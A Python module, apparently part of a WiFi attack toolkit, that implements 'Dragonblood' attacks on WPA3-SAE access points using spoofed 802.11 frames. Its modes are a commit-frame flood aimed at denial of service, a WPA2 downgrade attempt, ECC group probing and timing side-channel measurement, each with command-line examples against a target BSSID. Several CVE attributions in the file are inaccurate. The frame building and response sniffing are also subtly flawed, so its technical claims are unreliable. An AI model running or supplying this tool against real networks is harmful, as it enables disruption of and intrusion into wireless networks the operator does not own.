#!/usr/bin/env python3
"""
Dragonblood: WPA3 SAE Downgrade/Side-Channel Testing Module
for Hoover WiFi Security Toolkit.

Tests WPA3-SAE access points for the class of vulnerabilities known as
"Dragonblood" (Vanhoef & Ronen, 2019):

  * CVE-2019-9494 - anti-clogging token / commit-frame DoS behaviour
  * CVE-2019-9495 - side-channel group-negotiation / timing leaks
  * Transition-mode downgrade - WPA3-transition APs falling back to WPA2

REALISTIC LIMITATION: completing a full SAE handshake requires real ECC
math (scalar/element generation, Diffie-Hellman over the negotiated
group). This module focuses on testing *AP behaviour* -- which ECC
groups it accepts, how long it takes to respond, and whether a
WPA2-only association against a WPA3-transition AP is accepted -- not
on completing full SAE key exchanges. For complete SAE testing, use
`hostapd` + `wpa_supplicant` built with SAE support.

For authorized security testing and research only.
"""

import argparse
import json
import os
import struct
import sys
import threading
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import Dot11, Dot11Auth, Dot11Beacon, Dot11Elt, RadioTap
from scapy.packet import Raw
from scapy.sendrecv import sendp, sniff

from utils import require_root, setup_logging, validate_interface, validate_mac

# 802.11 authentication algorithm number for SAE
AUTH_ALGO_SAE = 3
AUTH_ALGO_OPEN = 0

# SAE authentication sequence numbers (Commit = seq 1, Confirm = seq 2)
SAE_AUTH_SEQ_COMMIT = 1
SAE_AUTH_SEQ_CONFIRM = 2

# Status code constants (per spec)
SAE_COMMIT = 0
SAE_CONFIRM = 0
ANTI_CLOGGING_TOKEN_REQUIRED = 76
UNSUPPORTED_GROUP = 77
STATUS_SUCCESS = 0

# ECC groups to test: 19 (P-256, mandatory), 20 (P-384), 21 (P-521),
# 25-29 (Brainpool curves)
MANDATORY_GROUP = 19
ECC_GROUPS = [19, 20, 21, 25, 26, 27, 28, 29]

# RSN AKM suite selectors
AKM_PSK = b"\x00\x0f\xac\x02"
AKM_SAE = b"\x00\x0f\xac\x08"
CIPHER_CCMP = b"\x00\x0f\xac\x04"

ATTACK_MODES = ("downgrade", "timing", "group-test", "clogging")

DEFAULT_SPOOFED_CLIENT = "DE:AD:BE:EF:00:01"


class DragonbloodAttack:
    """WPA3-SAE Dragonblood testing (downgrade / side-channel / DoS).

    Tests a target WPA3/WPA3-transition access point for known
    Dragonblood-class weaknesses: transition-mode downgrade to WPA2,
    ECC group negotiation / timing side channels, and anti-clogging
    token DoS behaviour.
    """

    def __init__(self, interface: str, target_bssid: str,
                 channel: Optional[int] = None,
                 attack_mode: str = "downgrade",
                 timeout: int = 120,
                 output_dir: str = "captures",
                 client_mac: Optional[str] = None) -> None:
        self.interface: str = interface
        self.target_bssid: str = target_bssid.upper()
        self.channel: Optional[int] = channel
        self.attack_mode: str = attack_mode
        self.timeout: int = timeout
        self.output_dir: str = output_dir
        self.client_mac: Optional[str] = client_mac.upper() if client_mac else None
        self.logger = setup_logging("dragonblood")

        self.captured_sae_frames: list[dict] = []
        self.results: dict = {}

        self._stop_event = threading.Event()
        self._start_time: Optional[float] = None
        self._running: bool = False
        self._lock = threading.Lock()

    # -----------------------------------------------------------------
    # Frame builders
    # -----------------------------------------------------------------

    def _build_sae_commit(self, group_id: int, scalar: bytes, element: bytes) -> bytes:
        """Build the body of an SAE Commit frame.

        Structure: Group ID (2 bytes, little-endian) + Scalar (32 bytes)
        + Element (64 bytes for P-256).

        Args:
            group_id: The finite cyclic group identifier being proposed.
            scalar: The SAE commit-scalar bytes.
            element: The SAE commit-element bytes.

        Returns:
            Raw bytes of the SAE Commit frame body.
        """
        return struct.pack("<H", group_id) + bytes(scalar) + bytes(element)

    def _build_sae_confirm(self, send_confirm: int, confirm: bytes) -> bytes:
        """Build the body of an SAE Confirm frame.

        Structure: Send-Confirm (2 bytes, little-endian) + Confirm (32 bytes).

        Args:
            send_confirm: The send-confirm counter value.
            confirm: The SAE confirm hash bytes.

        Returns:
            Raw bytes of the SAE Confirm frame body.
        """
        return struct.pack("<H", send_confirm) + bytes(confirm)

    def _build_rsn_ie(self, include_psk: bool = True, include_sae: bool = False) -> bytes:
        """Build an RSN information element body with the given AKMs.

        Args:
            include_psk: Whether to advertise AKM suite type 2 (PSK).
            include_sae: Whether to advertise AKM suite type 8 (SAE).

        Returns:
            Raw RSN IE bytes (tag + length + body).
        """
        akms = []
        if include_psk:
            akms.append(AKM_PSK)
        if include_sae:
            akms.append(AKM_SAE)
        if not akms:
            akms.append(AKM_PSK)

        body = (
            b"\x01\x00"            # RSN version 1
            + CIPHER_CCMP           # group cipher: CCMP
            + struct.pack("<H", 1)  # pairwise cipher count: 1
            + CIPHER_CCMP           # pairwise cipher: CCMP
            + struct.pack("<H", len(akms))  # AKM suite count
            + b"".join(akms)
            + b"\x00\x00"          # RSN capabilities
        )
        return body

    def _build_downgrade_beacon(self, ssid: str):
        """Build a beacon advertising WPA2-only (no SAE AKM).

        Used to test whether a WPA3-transition AP, or clients
        associated with it, can be coerced into a WPA2-only
        association by presenting them with a PSK-only RSN IE.

        Args:
            ssid: SSID to advertise in the beacon.

        Returns:
            A scapy Packet representing the downgrade beacon.
        """
        rsn_ie = self._build_rsn_ie(include_psk=True, include_sae=False)
        channel = self.channel or 1

        packet = (
            RadioTap()
            / Dot11Beacon(cap="ESS+privacy")
            / Dot11Elt(ID=0, info=ssid.encode())
            / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
            / Dot11Elt(ID=3, info=bytes([channel & 0xFF]))
            / Dot11Elt(ID=48, info=rsn_ie)
        )
        return packet

    # -----------------------------------------------------------------
    # Attack / testing primitives
    # -----------------------------------------------------------------

    def _send_anti_clogging_token_flood(self, count: int) -> None:
        """Send malformed anti-clogging token requests (CVE-2019-9494).

        Floods the target AP with SAE Commit frames carrying the
        "anti-clogging token required" status code, to probe for DoS
        / resource-exhaustion behaviour.

        Args:
            count: Number of flood frames to send.
        """
        client = self.client_mac or DEFAULT_SPOOFED_CLIENT
        for i in range(count):
            commit_body = self._build_sae_commit(MANDATORY_GROUP, b"\x00" * 32, b"\x00" * 64)
            frame = (
                RadioTap()
                / Dot11(addr1=self.target_bssid, addr2=client,
                        addr3=self.target_bssid, type=0, subtype=11)
                / Dot11Auth(algo=AUTH_ALGO_SAE, seqnum=SAE_AUTH_SEQ_COMMIT,
                            status=ANTI_CLOGGING_TOKEN_REQUIRED)
                / Raw(load=commit_body)
            )
            try:
                sendp(frame, iface=self.interface, verbose=False)
            except Exception as e:
                self.logger.warning("Error sending clogging flood frame %d/%d: %s",
                                     i + 1, count, e)

        self.logger.info("Sent %d anti-clogging token flood frames to %s",
                          count, self.target_bssid)

    def _extract_auth_status(self, packet) -> Optional[int]:
        """Extract the status code from a Dot11Auth packet, if present."""
        try:
            if packet.haslayer(Dot11Auth):
                return getattr(packet[Dot11Auth], "status", None)
        except Exception:
            pass
        return None

    def _test_group_negotiation(self, groups: list[int]) -> dict:
        """Test which ECC groups the target AP accepts.

        Sends an SAE Commit frame for each requested group and records
        whether the AP accepted it or rejected it (status code 77,
        unsupported group) -- a timing/behavioural side channel per
        CVE-2019-9495.

        Args:
            groups: List of ECC group identifiers to test.

        Returns:
            Dict mapping group_id -> {"accepted": bool, "status": int|None}.
        """
        client = self.client_mac or DEFAULT_SPOOFED_CLIENT
        results: dict = {}

        for group_id in groups:
            commit_body = self._build_sae_commit(group_id, b"\x11" * 32, b"\x22" * 64)
            frame = (
                RadioTap()
                / Dot11(addr1=self.target_bssid, addr2=client,
                        addr3=self.target_bssid, type=0, subtype=11)
                / Dot11Auth(algo=AUTH_ALGO_SAE, seqnum=SAE_AUTH_SEQ_COMMIT, status=0)
                / Raw(load=commit_body)
            )
            try:
                sendp(frame, iface=self.interface, verbose=False)
            except Exception as e:
                self.logger.warning("Error sending commit for group %d: %s", group_id, e)

            responses = sniff(iface=self.interface, timeout=2, count=1) or []

            status = None
            for resp in responses:
                status = self._extract_auth_status(resp)
                break

            accepted = status is not None and status != UNSUPPORTED_GROUP
            results[group_id] = {"accepted": accepted, "status": status}
            self.logger.info("Group %d: accepted=%s status=%s", group_id, accepted, status)

        with self._lock:
            self.results["group_negotiation"] = results
        return results

    def _measure_commit_timing(self, group_id: int, iterations: int) -> list[float]:
        """Measure AP response times to Commit frames for a given group.

        Used for cache-based side-channel detection (e.g. Brainpool
        curve timing differences).

        Args:
            group_id: ECC group identifier to measure.
            iterations: Number of commit/response round trips to time.

        Returns:
            List of elapsed response times in milliseconds.
        """
        client = self.client_mac or DEFAULT_SPOOFED_CLIENT
        timings: list[float] = []

        for _ in range(iterations):
            commit_body = self._build_sae_commit(group_id, b"\x33" * 32, b"\x44" * 64)
            frame = (
                RadioTap()
                / Dot11(addr1=self.target_bssid, addr2=client,
                        addr3=self.target_bssid, type=0, subtype=11)
                / Dot11Auth(algo=AUTH_ALGO_SAE, seqnum=SAE_AUTH_SEQ_COMMIT, status=0)
                / Raw(load=commit_body)
            )

            start_ns = time.perf_counter_ns()
            try:
                sendp(frame, iface=self.interface, verbose=False)
            except Exception as e:
                self.logger.warning("Error sending timing commit: %s", e)

            sniff(iface=self.interface, timeout=2, count=1)
            elapsed_ms = (time.perf_counter_ns() - start_ns) / 1_000_000.0
            timings.append(elapsed_ms)

        with self._lock:
            self.results.setdefault("timing", {})[group_id] = list(timings)
        return timings

    def _test_transition_mode_downgrade(self) -> dict:
        """Send a WPA2-only association to a WPA3-transition AP.

        Tests whether SAE can be bypassed entirely by presenting a
        PSK-only RSN IE in the association request.

        Returns:
            Dict with downgrade test results.
        """
        client = self.client_mac or DEFAULT_SPOOFED_CLIENT

        try:
            auth_frame = (
                RadioTap()
                / Dot11(addr1=self.target_bssid, addr2=client,
                        addr3=self.target_bssid, type=0, subtype=11)
                / Dot11Auth(algo=AUTH_ALGO_OPEN, seqnum=1, status=0)
            )
            sendp(auth_frame, iface=self.interface, verbose=False)
            time.sleep(0.1)

            rsn_ie = self._build_rsn_ie(include_psk=True, include_sae=False)
            assoc_frame = (
                RadioTap()
                / Dot11(addr1=self.target_bssid, addr2=client,
                        addr3=self.target_bssid, type=0, subtype=0)
                / Dot11Elt(ID=0, info=b"")
                / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
                / Dot11Elt(ID=48, info=rsn_ie)
            )
            sendp(assoc_frame, iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.warning("Error sending transition-mode downgrade frames: %s", e)

        responses = sniff(iface=self.interface, timeout=3, count=1) or []

        status_code = None
        for resp in responses:
            status_code = self._extract_auth_status(resp)
            break

        downgrade_successful = status_code is not None and status_code == STATUS_SUCCESS

        result = {
            "downgrade_successful": downgrade_successful,
            "status_code": status_code,
            "target_bssid": self.target_bssid,
        }
        with self._lock:
            self.results["transition_downgrade"] = result
        return result

    # -----------------------------------------------------------------
    # Packet handling
    # -----------------------------------------------------------------

    def packet_handler(self, packet) -> None:
        """Process SAE Authentication frames from the target AP.

        Captures Dot11Auth frames whose auth algorithm is SAE (3) for
        later analysis; ignores all other authentication frames.

        Args:
            packet: Scapy packet from the sniffer.
        """
        if not packet.haslayer(Dot11Auth):
            return

        auth = packet[Dot11Auth]
        if getattr(auth, "algo", None) != AUTH_ALGO_SAE:
            return

        src_mac = None
        if packet.haslayer(Dot11):
            src_mac = packet[Dot11].addr2

        frame_info = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "src_mac": src_mac or "unknown",
            "seqnum": getattr(auth, "seqnum", None),
            "status": getattr(auth, "status", None),
        }

        with self._lock:
            self.captured_sae_frames.append(frame_info)
        self.logger.info(
            "Captured SAE Authentication frame from %s (seq=%s, status=%s)",
            src_mac or "unknown", frame_info["seqnum"], frame_info["status"],
        )

    # -----------------------------------------------------------------
    # Orchestration
    # -----------------------------------------------------------------

    def start(self) -> dict:
        """Run the selected attack mode and return results.

        Returns:
            Dict with the attack mode, target, and mode-specific data.
        """
        self.logger.info("Starting Dragonblood attack (mode=%s) against %s",
                          self.attack_mode, self.target_bssid)
        self._running = True
        self._start_time = time.time()

        data: dict = {}
        try:
            if self.attack_mode == "downgrade":
                data = self._test_transition_mode_downgrade()
            elif self.attack_mode == "timing":
                data = {
                    group_id: self._measure_commit_timing(group_id, iterations=10)
                    for group_id in ECC_GROUPS
                }
            elif self.attack_mode == "group-test":
                data = self._test_group_negotiation(ECC_GROUPS)
            elif self.attack_mode == "clogging":
                self._send_anti_clogging_token_flood(count=50)
                data = {"frames_sent": 50}
            else:
                self.logger.error("Unknown attack mode: %s", self.attack_mode)
        finally:
            self._running = False

        with self._lock:
            self.results["mode"] = self.attack_mode
            self.results["target_bssid"] = self.target_bssid
            self.results["data"] = data
            self.results["captured_sae_frames"] = list(self.captured_sae_frames)

        return self.results

    def save_results(self) -> Optional[str]:
        """Save timing data and findings to JSON.

        Returns:
            Path to the saved JSON file, or None if there was nothing
            to save or the save failed.
        """
        if not self.results:
            return None

        try:
            os.makedirs(self.output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(self.output_dir, f"dragonblood_{timestamp}.json")
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(self.results, f, indent=2, default=str)
            self.logger.info("Results saved to %s", filepath)
            return filepath
        except Exception as e:
            self.logger.error("Failed to save results: %s", e)
            return None

    def get_status(self) -> dict:
        """Return current attack status.

        Returns:
            Dict with running state, target info, and capture counts.
        """
        elapsed = 0.0
        if self._start_time is not None:
            elapsed = time.time() - self._start_time

        with self._lock:
            captured_count = len(self.captured_sae_frames)

        return {
            "running": self._running,
            "interface": self.interface,
            "target_bssid": self.target_bssid,
            "attack_mode": self.attack_mode,
            "channel": self.channel,
            "captured_sae_frames": captured_count,
            "elapsed_seconds": round(elapsed, 1),
            "timeout": self.timeout,
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Dragonblood - WPA3 SAE Downgrade/Side-Channel Testing. "
            "For authorized security testing and research only."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test transition-mode downgrade (default mode)
  sudo python3 dragonblood.py -i wlan0mon -b AA:BB:CC:DD:EE:FF

  # Measure SAE Commit timing across ECC groups
  sudo python3 dragonblood.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -m timing

  # Test which ECC groups the AP accepts
  sudo python3 dragonblood.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -m group-test

  # Anti-clogging token flood (CVE-2019-9494)
  sudo python3 dragonblood.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -m clogging

Note: This module tests AP behaviour (group acceptance, timing,
transition-mode fallback) rather than completing full SAE handshakes.
For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface in monitor mode")
    parser.add_argument("-b", "--bssid", required=True,
                        help="Target AP BSSID")
    parser.add_argument("-ch", "--channel", type=int, default=None,
                        help="Channel to operate on")
    parser.add_argument("-m", "--mode", default="downgrade",
                        choices=list(ATTACK_MODES),
                        help="Attack mode (default: downgrade)")
    parser.add_argument("-t", "--timeout", type=int, default=120,
                        help="Timeout in seconds (default: 120)")
    parser.add_argument("--client-mac", default=None,
                        help="Spoofed client MAC address")
    parser.add_argument("-o", "--output-dir", default="captures",
                        help="Output directory for results (default: captures)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()
    require_root()

    if not validate_interface(args.interface):
        print(f"Invalid interface: {args.interface}", file=sys.stderr)
        sys.exit(1)

    if not validate_mac(args.bssid):
        print(f"Invalid BSSID: {args.bssid}", file=sys.stderr)
        sys.exit(1)

    if args.client_mac and not validate_mac(args.client_mac):
        print(f"Invalid client MAC: {args.client_mac}", file=sys.stderr)
        sys.exit(1)

    attack = DragonbloodAttack(
        interface=args.interface,
        target_bssid=args.bssid,
        channel=args.channel,
        attack_mode=args.mode,
        timeout=args.timeout,
        output_dir=args.output_dir,
        client_mac=args.client_mac,
    )

    attack.start()
    attack.save_results()
    sys.exit(0)


if __name__ == "__main__":
    main()
